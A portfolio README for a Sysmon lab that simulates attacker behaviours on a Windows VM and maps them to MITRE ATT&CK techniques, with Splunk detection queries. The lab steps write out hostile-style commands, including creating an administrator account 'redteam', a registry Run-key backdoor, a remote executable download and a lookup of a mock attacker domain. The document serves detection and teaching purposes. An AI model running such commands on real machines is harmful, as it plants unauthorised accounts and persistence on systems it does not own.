# 🛡️ Sysmon + MITRE ATT\&CK Mapping Portfolio

This project demonstrates how to collect endpoint telemetry using Sysmon and detect adversary behaviors by mapping log events to MITRE ATT\&CK techniques. It simulates attacker behavior on a Windows 10 machine, collects logs, analyzes them, and documents how each maps to a technique in the MITRE ATT\&CK framework.

---

## 🧰 Lab Setup

### Tools Used:

* **Windows 10 VM** (with Sysmon installed)
* **Sysmon**: for process, registry, network, and DNS logging
* **Splunk** (or Event Viewer): log analysis
* **MITRE ATT\&CK Framework**: behavior mapping
* Optional: **Sigma Rules** for detection logic

### Architecture:

```
[Windows 10 VM] -- Sysmon logs --> [Log Analyzer (Splunk/Event Viewer)] --> [MITRE ATT&CK Mapping]
```

---

## 🔧 Installation and Configuration

### Step 1: Install Sysmon

```powershell
sysmon64.exe -accepteula -i sysmonconfig-export.xml
```

### Step 2: Simulate Attacker Behaviors

Run safe commands to mimic common threats:

1. **Encoded PowerShell**:

```powershell
powershell -enc aGVsbG8=
```

MITRE: T1059.001 (PowerShell Execution)

2. **New Admin Account Creation**:

```powershell
net user redteam Pass123! /add
net localgroup administrators redteam /add
```

MITRE: T1136 (Create Account)

3. **Registry Persistence**:

```powershell
reg add HKCU\... /v Backdoor /d C:\malware.exe
```

MITRE: T1547.001 (Registry Run Keys)

4. **File Download via PowerShell**:

```powershell
Invoke-WebRequest http://example.com/tool.exe -OutFile tool.exe
```

MITRE: T1105 (Ingress Tool Transfer)

5. **DNS Beaconing**:

```powershell
nslookup attacker.testdomain.com
```

MITRE: T1071.004 (DNS Communication)

---

## 🔍 Detection Queries (Splunk)

* **PowerShell Encoded Command**:

```spl
index=sysmon EventCode=1 CommandLine="* -enc *"
```

* **Registry Autorun Keys**:

```spl
index=sysmon EventCode=13 TargetObject="*Run*"
```

* **DNS Lookups**:

```spl
index=sysmon EventCode=22 QueryName="*.testdomain.com"
```

---

## 📊 MITRE Mapping Table

| # | Behavior                 | Sysmon Event ID | MITRE Technique ID | Description              |
| - | ------------------------ | --------------- | ------------------ | ------------------------ |
| 1 | Encoded PowerShell       | 1               | T1059.001          | PowerShell execution     |
| 2 | Registry Run Key         | 13              | T1547.001          | Persistence via registry |
| 3 | New User Account         | 1               | T1136              | Account creation         |
| 4 | File Download via Script | 1, 11           | T1105              | Remote tool delivery     |
| 5 | DNS Query                | 22              | T1071.004          | DNS C2 communication     |

---

## 🗂️ Project Structure

```
Sysmon-MITRE-Mapping/
├── README.md
├── sysmon_config/
│   └── sysmonconfig-export.xml
├── simulated_attacks/
│   └── attack_scripts.ps1
├── mapping/
│   └── mitre_mapping_table.md
├── splunk_queries/
│   └── detection_queries.md
├── screenshots/
│   └── powershell_detected.png
```

---

## ✅ Skills Demonstrated

* Endpoint telemetry collection
* Simulated adversarial techniques
* Log analysis using SPL
* Detection engineering
* MITRE ATT\&CK alignment
* SOC documentation

---

## 👨‍💻 Author

**Ajao Ibrahim Adewale**
Google Cybersecurity Certificate Holder
\[GitHub Profile Link Placeholder]
